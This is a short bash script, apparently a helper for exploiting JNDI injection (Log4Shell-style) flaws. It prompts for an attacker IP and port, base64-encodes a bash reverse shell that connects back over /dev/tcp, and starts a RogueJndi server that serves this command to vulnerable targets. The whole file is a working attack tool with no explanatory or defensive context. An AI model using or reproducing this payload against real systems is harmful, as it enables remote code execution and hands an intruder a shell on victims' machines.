#!/bin/bash
echo "my ip:"
read my_ip
echo "my port:"
read my_port
reverse_shell=`echo 'bash -c bash -i >&/dev/tcp/'$my_ip'/'$my_port' 0>&1' |base64`
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,$reverse_shell}|{base64,-d}|{bash,-i}" --hostname $my_ip